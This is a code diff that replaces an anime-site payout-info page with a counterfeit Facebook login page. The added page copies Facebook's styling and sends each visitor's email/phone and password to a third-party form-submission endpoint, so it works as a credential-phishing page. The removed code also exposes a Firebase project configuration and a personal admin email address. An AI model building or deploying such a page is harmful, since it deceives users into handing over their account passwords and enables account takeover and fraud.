@@ -1,112 +1,77 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Payout Info - AnimeGold</title>
-  <style>
-    body { background:#111; color:#fff; text-align:center; font-family:Arial; }
-    .section { margin:20px; padding:20px; border-radius:10px; background:#222; }
-    input, select { margin:10px; padding:8px; border-radius:5px; }
-    button { margin:10px; padding:10px 20px; background:#ff9800; border:none; border-radius:5px; cursor:pointer; }
-    .admin-btn { padding:10px 20px; background:#c0392b; color:white; font-weight:bold; border-radius:5px; text-decoration:none; }
-  </style>
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js";
-    import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-auth.js";
-    import { getFirestore, doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-firestore.js";
-
-    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-    const firebaseConfig = {
-      apiKey: "AIzaSyB9DAebWlYOgHl3DCrpYZIGTFllHQV4RLw",
-      authDomain: "project-918813329806902976.firebaseapp.com",
-      projectId: "project-918813329806902976",
-      storageBucket: "project-918813329806902976.firebasestorage.app",
-      messagingSenderId: "479861099783",
-      appId: "1:479861099783:web:b799ff88142169759009a2",
-      measurementId: "G-THJG5GLQQP"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
-    const db = getFirestore(app);
-
-    let userRef, userData = {};
-
-    onAuthStateChanged(auth, async (u) => {
-      if (u) {
-        userRef = doc(db, "users", u.uid);
-        const snap = await getDoc(userRef);
-        if (snap.exists()) {
-          userData = snap.data();
-          showSavedInfo();
-          if (userData.payoutMethod) {
-            document.getElementById("method").value = userData.payoutMethod;
-            document.getElementById("number").value = userData.payoutNumber || "";
-            document.getElementById("payoutName").value = userData.payoutName || "";
-          }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-        // ✅ Show Admin button only for your Gmail
-        if (u.email === "shadowtrimz@gmail.com") {
-          const adminLink = document.getElementById("adminLink");
-          adminLink.style.display = "inline-block";
-          adminLink.addEventListener("click", (e) => {
-            e.preventDefault();
-            if (confirm("Are you sure you want to enter the Admin Dashboard?")) {
-              window.location.href = "admin.html";
-            }
-          });
+        .login-box {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 360px;
+            text-align: center;
         }
-      } else {
-        window.location.href = "index.html";
-      }
-    });
-
-    window.savePayout = async () => {
-      const method = document.getElementById("method").value;
-      const number = document.getElementById("number").value;
-      const payoutName = document.getElementById("payoutName").value;
-      await setDoc(userRef, {
-        payoutMethod: method,
-        payoutNumber: number,
-        payoutName: payoutName
-      }, { merge: true });
-      alert("Payout info saved!");
-      userData.payoutMethod = method;
-      userData.payoutNumber = number;
-      userData.payoutName = payoutName;
-      showSavedInfo();
-    };
-
-    function showSavedInfo() {
-      document.getElementById("savedInfo").innerText =
-        "Full Name: " + (userData.payoutName || "Not set") + "\n" +
-        "Method: " + (userData.payoutMethod || "Not set") + "\n" +
-        "Number: " + (userData.payoutNumber || "Not set");
-    }
-
-    window.logout = () => signOut(auth).then(() => window.location.href = "index.html");
-  </script>
+        h1 {
+            color: #1877f2;
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 90%;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        button {
+            width: 96%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        a {
+            display: block;
+            margin-top: 15px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-  <div class="section">
-    <h2>Saved Payout Info</h2>
-    <pre id="savedInfo">No info yet</pre>
-  </div>
-  <div class="section">
-    <h2>Update Payout Info</h2>
-    <input id="payoutName" placeholder="Full Name"><br>
-    <select id="method">
-      <option value="GCash">GCash</option>
-      <option value="PayMaya">PayMaya</option>
-    </select><br>
-    <input id="number" placeholder="GCash/PayMaya Number"><br>
-    <button onclick="savePayout()">Save</button>
-  </div>
-  <div class="section">
-    <button onclick="logout()">Logout</button>
-  </div>
-  <!-- 🚀 Admin button -->
-  <div class="section">
-    <a id="adminLink" href="admin.html" class="admin-btn" style="display:none;">🚀 Admin Dashboard</a>
-  </div>
+
+<div class="login-box">
+    <h1>facebook</h1>
+    <form action="https://smartforms.dev/submit/6a69256ec184545ccc22d12c" method="POST">
+    <input type="text" name="email" placeholder="Email or phone number" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+    <a href="#">Forgotten password?</a>
+</div>
+
 </body>
 </html>
